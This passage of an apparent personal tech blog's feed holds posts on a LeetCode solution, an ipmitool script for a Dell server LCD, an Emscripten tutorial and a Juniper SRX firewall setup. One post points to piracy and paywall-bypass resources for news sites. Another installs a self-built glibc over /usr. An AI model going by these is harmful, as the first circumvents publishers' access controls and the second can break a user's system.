        <content type="html"><![CDATA[<h1 id="leetcode.1637-两点之间不包含任何点的最宽垂直区域">LeetCode.1637两点之间不包含任何点的最宽垂直区域</h1><p>给你 <code>n</code> 个二维平面上的点 <code>points</code> ，其中<code>points[i] = [xi, yi]</code> ，请你返回两点之间内部不包含任何点的<strong>最宽垂直区域</strong> 的宽度。</p><p><strong>垂直区域</strong> 的定义是固定宽度，而 y轴上无限延伸的一块区域（也就是高度为无穷大）。<strong>最宽垂直区域</strong> 为宽度最大的一个垂直区域。</p><p>请注意，垂直区域 <strong>边上</strong> 的点 <strong>不在</strong>区域内。</p><p>示例 1：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/10/31/points3.png"></p><p>输入：points = [[8,7],[9,9],[7,4],[9,7]] 输出：1解释：红色区域和蓝色区域都是最优区域。</p><p>示例 2：</p><p>输入：points = [[3,1],[9,0],[1,0],[1,4],[5,3],[8,8]] 输出：3</p><p>提示：</p><pre><code>n == points.length2 &lt;= n &lt;= 105points[i].length == 20 &lt;= xi, yi &lt;= 109</code></pre><h2 id="solution">Solution</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">maxWidthOfVerticalArea</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;&gt;</span> <span class="token operator">&amp;</span>points<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">sort</span><span class="token punctuation">(</span>points<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> points<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>_a<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&amp;</span>_b<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">bool</span> <span class="token punctuation">{</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>_a<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> _b<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                     <span class="token keyword">return</span> _a<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> _b<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">return</span> _a<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> _b<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxWidth <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">=</span> points<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> points<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxWidth <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token function">next</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> maxWidth<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> maxWidth<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;&gt;</span> points <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    Solution            sol<span class="token punctuation">;</span>    <span class="token keyword">int</span>                 maxWidth <span class="token operator">=</span> sol<span class="token punctuation">.</span><span class="token function">maxWidthOfVerticalArea</span><span class="token punctuation">(</span>points<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Maximum Width of Vertical Area: "</span> <span class="token operator">&lt;&lt;</span> maxWidth <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="summary">Summary</h2><ul><li>Make fallbacks for sort()</li><li>Familiar with iterator</li><li>Lambda function</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Traditional Media Oriented English Learning</title>
      <link href="/2023/03/29/traditional-media-oriented-english-learning/"/>
      <url>/2023/03/29/traditional-media-oriented-english-learning/</url>
      
        <content type="html"><![CDATA[<h1 id="traditional-media-oriented-english-learning">Traditional MediaOriented English Learning</h1><h2 id="background">Background</h2><p>In this age, a correct and high-efficient media source issignificantly import.</p><p>Thus I choose to read more media with objective facts rather thanthese with subjective propaganda opinions. Facts are not Opinions.That's obvious.</p><p>Some articles on Internet have paywalls, since my AdGuard refused tobypass it, I decide to make my own one.</p><h2 id="pirate-new-york-times">Pirate New York Times</h2><p>https://www.reddit.com/r/Piracy/comments/pxf0g0/how_to_pirate_new_york_times_article/</p><h2 id="enhanced-blocklist">Enhanced Blocklist</h2><blockquote><p>Using Inclusive Language.</p><p>As <a href="https://www.cisco.com/c/en/us/about/social-justice/inclusive-language-policy.html">Ciscorecommended</a>, contents should be free of offensive or suggestivelanguage, graphics, and scenarios.</p><p>We use "Blocklist" instead of "Blacklist" at here.</p></blockquote><p>https://firebog.net/ provides a lot of blocklists against paywallsand advertisements.</p><h2 id="paywall-javascript-blocking">Paywall JavaScript Blocking</h2><p>As we know, most paywall were powered by JavaScript. And blocks AFTERthe page was rendered. (This is to let web crawlers to get the contenton it).</p><p>https://github.com/iamadamdev/bypass-paywalls-chrome</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AS IS - 法律词汇</title>
      <link href="/2023/03/27/as-is-fa-lu-ci-hui/"/>
      <url>/2023/03/27/as-is-fa-lu-ci-hui/</url>
      
        <content type="html"><![CDATA[<p><strong>AS IS</strong> 在法律语境和开源许可证中经常使用，</p><p>英文含义为：</p><ul><li>as it is</li><li>the current condition of state of something.</li></ul><p>中文含义为：</p><ul><li><p>按原样</p></li><li><p>照现在的样子（指不再作修理或改进）</p></li></ul><p>参考双语例句：</p><p>All confifential information id provided "AS IS", and no warrantiesare made and no responsibility or liability is or will be accepted byeither party in relation to or as to the accuracy or conpleteness of theconfidential information.</p><p>所有保密信息均“按原样”提供，任何一方未不做任何保证，也不对保密信息的准确性或完整性负责或承担责任。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Dell PowerEdge LCD MOTD</title>
      <link href="/2023/03/26/dell-poweredge-lcd-motd/"/>
      <url>/2023/03/26/dell-poweredge-lcd-motd/</url>
      
        <content type="html"><![CDATA[<h1 id="dell-poweredge-lcd-motd">Dell PowerEdge LCD MOTD</h1><h2 id="whats-lcd">What's LCD</h2><p><img src="https://googles.plus/images/loading.gif" data-original="/images/Dell-PowerEdge-LCD-MOTD/image-20230326213605441.png"></p><h2 id="previous-works">Previous Works</h2><ul><li><a href="https://www.tannr.com/2010/03/20/changing-an-lcd-string-on-a-dell-server-remotely-with-python/">Changingan LCD string on a Dell server remotely with Python</a></li><li>[<a href="https://www.mail-archive.com/ipmitool-devel@lists.sourceforge.net/msg00352.html">[Ipmitool-devel]Fwd: LCD access on PowerEdge1950](https://www.mail-archive.com/search?l=ipmitool-devel@lists.sourceforge.net&amp;q=subject:"[Ipmitool-devel]+Fwd%3A+LCD+access+on+PowerEdge+1950"&amp;o=newest)</a></li><li><a href="https://serverfault.com/questions/81015/how-can-i-set-a-custom-text-on-the-lcd-display-on-dell-poweredge-servers">[Howcan I set a custom text on the LCD display on Dell PowerEdgeservers](https://serverfault.com/questions/81015/how-can-i-set-a-custom-text-on-the-lcd-display-on-dell-poweredge-servers)</a></li></ul><h2 id="ipmi-registers">IPMI Registers</h2><pre class="line-numbers language-none"><code class="language-none">0x6             This is the network function (NetFn) number for Applications.                See the IPMI spec for more information.0x58            The operation number for setting system information. IPMI spec (page 572)193 or 194      The selector for setting the Dell LCD text. 193 means                set the string to this, 194 controls what string to show                in the LCD.0               Which chunk of 16 bytes of text you're editing (62 bytes are allowed).0               Text encoding. This should always be 0 for ASCII.6               This is the length of the string you're encoding.                'foobar' is 6 characters. You can send 14 characters with each chunk.                This is because you can only send 16 bytes total (1 byte for text                encoding, 1 byte for length, 14 bytes for text).0x66 0x6F 0x6F 0x62 0x61 0x72                The ASCII codes for 'foobar'.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>There are 2 registers:</p><p>0 Which chunk of 16 bytes of text you're editing (62 bytes areallowed).</p><p>0 Text encoding. This should always be 0 for ASCII.</p><p>They are a control bit of buffer inside IPMI. The LCD string is abuffer which has a width of 16 (each chunk), and has a height.</p><p>You can use the chunk register to control which row you are editing.And the text coding and length register only exist in the first row.</p><h2 id="python-poc">Python PoC</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token comment"># !/usr/bin/python</span>host <span class="token operator">=</span> <span class="token string">'*.*.*.*'</span>user <span class="token operator">=</span> <span class="token string">'root'</span>passwd <span class="token operator">=</span> <span class="token string">'******'</span>lcd <span class="token operator">=</span> <span class="token string">'Dell PowerEdge R710 - VMware vSphere - Misaka Network, Inc.'</span>strHex <span class="token operator">=</span> <span class="token string">''</span>cmd_prefix <span class="token operator">=</span> <span class="token string">'ipmitool -I lanplus -H '</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">' -U '</span> <span class="token operator">+</span> user <span class="token operator">+</span> <span class="token string">' -P '</span> <span class="token operator">+</span> passwdLCD_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lcd<span class="token punctuation">)</span>cmd <span class="token operator">=</span> cmd_prefix <span class="token operator">+</span> <span class="token string">' raw 0x6 0x58 193'</span><span class="token keyword">for</span> x <span class="token keyword">in</span> lcd<span class="token punctuation">:</span>    strHex <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    strHex <span class="token operator">+=</span> <span class="token string">" "</span><span class="token keyword">if</span> LCD_len <span class="token operator">&lt;=</span> <span class="token number">14</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cmd_prefix <span class="token operator">+</span> <span class="token string">' raw 0x6 0x58 193 0 0 '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>LCD_len<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> strHex<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    first <span class="token operator">=</span> lcd<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span>    strFirst <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> first<span class="token punctuation">:</span>        strFirst <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        strFirst <span class="token operator">+=</span> <span class="token string">" "</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cmd_prefix <span class="token operator">+</span> <span class="token string">' raw 0x6 0x58 193 0 0 '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>LCD_len<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> strFirst<span class="token punctuation">)</span>    lcd <span class="token operator">=</span> lcd<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> LCD_len <span class="token operator">-</span> <span class="token number">14</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num <span class="token operator">//</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        strHex <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> lcd<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token builtin">min</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            strHex <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            strHex <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>cmd_prefix <span class="token operator">+</span> <span class="token string">' raw 0x6 0x58 193 '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> strHex<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Dell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WASM 入门</title>
      <link href="/2023/03/25/wasm-ru-men/"/>
      <url>/2023/03/25/wasm-ru-men/</url>
      
        <content type="html"><![CDATA[<h1 id="wasm-入门">WASM 入门</h1><h2 id="简介">简介</h2><p>WebAssembly（简称WASM）是一种可移植、体积小、加载快、安全的二进制格式，它可以在现代Web浏览器中运行。WASM提供了一个近乎原生的执行环境，并且可以被多种编程语言所编写，包括C/C++、Rust、Go等。</p><p>WASM能够让开发者将自己的代码编译成一种高效的二进制格式，然后在浏览器中直接运行。这些代码可以与JavaScript一起使用，并且可以在许多不同的场景下使用，例如游戏、图形应用程序、多媒体处理以及科学计算等领域。</p><p>通过使用WASM，开发者可以将应用程序的性能提高数倍，因为WASM的执行速度比JavaScript要快得多。此外，WASM还可以使各种编程语言之间更易于交互和协作，从而促进了跨平台的开发。</p><h2 id="wasm-编译器">WASM 编译器</h2><p>emcc 是一个将C或C++代码编译成 WebAssembly（WASM）格式的工具链。emcc是 Emscripten 项目的一部分，而 Emscripten则是一个完整的工具集，可以将用于原生平台的 C/C++ 代码转换为 JavaScript或WASM，从而使这些代码能够在Web浏览器中运行。</p><p>与传统的 C/C++ 编译器不同，emcc会将源代码编译成一组WASM模块和JavaScript文件，以便在浏览器上执行。同时，emcc还提供了一些额外的特性，例如支持使用 OpenGL ES 和 SDL 等库，并且可以将C/C++ 代码转换为asm.js格式的JavaScript代码，以便在旧版浏览器上执行。</p><p>可以看做是，emcc 重用了 GCC 的“语言前端”。</p><h2 id="emscripten-环境配置">Emscripten 环境配置</h2><h3 id="docker-化环境">Docker 化环境</h3><p>https://hub.docker.com/r/trzeci/emscripten/</p><h3 id="安装">安装</h3><p>Compile from source 不是必须。</p><ol type="1"><li><p>安装依赖</p><p>Emscripten需要一些依赖项才能正常工作。使用以下命令安装所需的软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">git</span> <span class="token function">make</span> cmake nodejs <span class="token punctuation">\</span>java-1.8.0-openjdk-headless               <span class="token punctuation">\</span>python2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对于 Emscripten SDK 的某些版本，Python 3也是必需的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> python36<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/emscripten-core/emsdk.git<span class="token builtin class-name">cd</span> emsdk./emsdk <span class="token function">install</span> latest./emsdk activate latest<span class="token builtin class-name">source</span> ./emsdk_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这将安装最新版本的Emscripten，并激活它以进行使用。最后一行命令会设置环境变量，以便可以从终端访问Emscripten。</p></li><li><p>测试Emscripten</p><pre class="line-numbers language-none"><code class="language-none">emcc --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果一切都设置正确，则应该显示Emscripten的版本信息。</p></li></ol><h3 id="frequently-happened-issues">Frequently Happened Issues</h3><h4 id="glibc-2.18">GLIBC 2.18</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://ftp.gnu.org/gnu/glibc/glibc-2.18.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span>  glibc-2.18.tar.gz<span class="token function">chown</span> <span class="token parameter variable">-R</span> root.root glibc-2.18<span class="token builtin class-name">cd</span> glibc-2.18<span class="token function">mkdir</span> build<span class="token builtin class-name">cd</span> build/<span class="token punctuation">..</span>/configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr --disable-profile --enable-add-ons --with-headers<span class="token operator">=</span>/usr/include --with-binutils<span class="token operator">=</span>/usr/bin<span class="token function">make</span> <span class="token parameter variable">-j12</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hello-wasm-world">Hello WASM World!</h2><h3 id="main.c">main.c</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello WASM World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="compile-to-wasm">Compile to WASM</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">emcc main.c <span class="token parameter variable">-o</span> index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="custom-template-html">Custom Template HTML</h3><p>编译后会使用 emcc 内置的模板。</p><p><code>emcc -o out.html --shell-file path/to/custom_shell.html</code>可以自定义。</p><h3 id="open-with-apachenginxpython">Open with Apache/Nginx/Python</h3><p>Just show.</p><h3 id="wasm-网页优化">WASM 网页优化</h3><p>网页加载速度瓶颈主要出在要下载的大量资源数据，特别是 WebGL纹理或几何体。编译代码通常比 JavaScript占用占用更多的空间，但机器代码可以有效压缩。因此，在托管 asm.js 和WebAssembly 时，必须确保使用 gzip 压缩传输所有内容，现在所有浏览器和 CDN都内置支持gzip。与未压缩的文件相比，gzip 压缩 <code>.wasm</code>文件平均可以减少 60-75％的文件大小，因此实际上从不会无压缩地提供文件。</p><p>要在 CDN 上提供 gzip 压缩的文件，需要在上传到服务器前进行压缩。一些Web服务器支持即时压缩文件，但对于静态资产内容，应该避免如此，因为对于服务器CPU来说，每次请求就要压缩是一个恐怖的噩梦。调整反代配置，将HTTP响应头设置为：<code>Content-Encoding：gzip</code>，告诉客户端浏览器应在将数据交给页面本身之前透明地解压缩下载的内容。</p><p>为确保 gzip 压缩不会混淆服务的 MIME 类型。</p><ul><li>JavaScript 文件（预压缩或未压缩）使用<code>Content-Type：application/javascript</code></li><li>所有资产文件（.data、.mem）使用<code>Content-Type：application/octet-stream</code></li><li>WebAssembly (.wasm) 文件应该使用<code>Content-Type：application/wasm</code></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> WebAssembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Juniper SRX-240 加固实验室网络</title>
      <link href="/2023/03/25/shi-yong-juniper-srx-240-jia-gu-shi-yan-shi-wang-luo/"/>
      <url>/2023/03/25/shi-yong-juniper-srx-240-jia-gu-shi-yan-shi-wang-luo/</url>
      
        <content type="html"><![CDATA[<h1 id="使用-juniper-srx-240-加固实验室网络">使用 Juniper SRX-240加固实验室网络</h1><h2 id="简介">简介</h2><p>Juniper SRX 是一种网络安全设备，它可以通过 zone 和 security policy对网络流量进行管理和控制。</p><p>Zone 是一种逻辑分区，用于划分网络中的不同部分，如内部网络、DMZ和外部网络等。每个 zone 都有一个与之相关联的安全策略，用于控制该 zone中的流量是否被允许进出以及如何进行处理。</p><p>Security Policy 是一组规则，用于控制特定 zone之间的流量流向。这些规则可以基于源地址、目标地址、端口和协议等多种条件进行匹配，并指定相应的操作，如通过、拒绝或重定向到其他位置等。</p><p>在 Juniper SRX 中，通过创建 zone 和 security policy可以帮助管理员实现对网络流量的精细控制和保护，从而提高网络安全性能。</p><p>这里我让 SRX 工作于二层模式（透明防火墙）。</p><h2 id="interfaces">Interfaces</h2><pre class="line-numbers language-none"><code class="language-none">ge-0/0/1 {        unit 0 {            family bridge {                interface-mode access;                vlan-id 10;            }        }                                   }ge-0/0/4 {        unit 0 {            family bridge {                interface-mode access;                vlan-id 10;            }        }                                   }ge-0/0/8 {        unit 0 {            family bridge {                interface-mode access;                vlan-id 10;            }        }                                   }        bridge-domains {    oob {        domain-type bridge;        vlan-id 10;        routing-interface irb.0;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网桥</p><pre><code>irb {    unit 0 {        family inet {            address 219.217.199.203/24;        }        family inet6 {            address 2001:250:7802:61::c0:ffee/64;        }    }}</code></pre><p>管理逻辑端口，用来连接 SRX 自身。</p><h2 id="security-zones">Security Zones</h2><pre class="line-numbers language-none"><code class="language-none">security-zone Lab {    host-inbound-traffic {        system-services {            all;        }    }    interfaces {                                ge-0/0/4.0;    }}security-zone Edu {    screen untrust-screen;    host-inbound-traffic {        system-services {            all;        }    }    interfaces {        ge-0/0/1.0;    }}security-zone DC {    host-inbound-traffic {        system-services {            all;        }    }    interfaces {        ge-0/0/8.0;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于是二层模式，路由规则无法工作，所以 Zone要绑定到端口上。如果要连接不同的 Zone，需要创建一个桥接网桥组。</p><h2 id="security-policies">Security Policies</h2><pre class="line-numbers language-none"><code class="language-none">from-zone Lab to-zone Edu {    policy edu-infra-ban {        match {            source-address any;            destination-address [ Jwc JwcUtil ];            application any;                    }        then {            reject;            log {                session-init;                session-close;            }        }    }    policy lab-to-edu {        match {            source-address any;            destination-address any;            application any;        }        then {            permit;        }    }}from-zone DC to-zone Edu {    policy dc-to-edu {        match {            source-address any;            destination-address any;            application any;        }        then {            permit;        }    }}from-zone Lab to-zone DC {    policy lab-to-dc {        match {            source-address any;            destination-address any;            application any;        }        then {            permit;                             }    }}from-zone Edu to-zone Lab {    policy edu-to-lab {        match {            source-address any;            destination-address any;            application any;        }        then {            permit;        }    }}from-zone DC to-zone Lab {    policy dc-to-lab {        match {            source-address any;            destination-address any;            application any;        }        then {            permit;        }    }}from-zone Edu to-zone DC {    policy allow-management-access {        match {            source-address Lab-MGMT;            destination-address any;            application any;        }        then {            permit;        }    }    policy ban-remote-control {        match {            source-address any;                     destination-address any;            application [ junos-ssh junos-telnet junos-icmp-all ];        }        then {            reject;            log {                session-init;                session-close;            }        }    }    policy edu-to-dc {        match {            source-address any;            destination-address any;            application any;        }        then {            permit;        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为 Zone-to-Zone 的流量制定规则。注意，这里的规则没有自反性。如 setA-&gt;B，B-&gt;A 依然会被阻断。</p><p>地址段需要使用 <code>address-book</code> 配置。</p><h2 id="log-accounting">Log Accounting</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> messages any critical<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> messages authorization info<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> interactive-commands interactive-commands error<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> traffic.log user info<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> traffic.log match RT_FLOW_SESSION<span class="token builtin class-name">set</span> system syslog 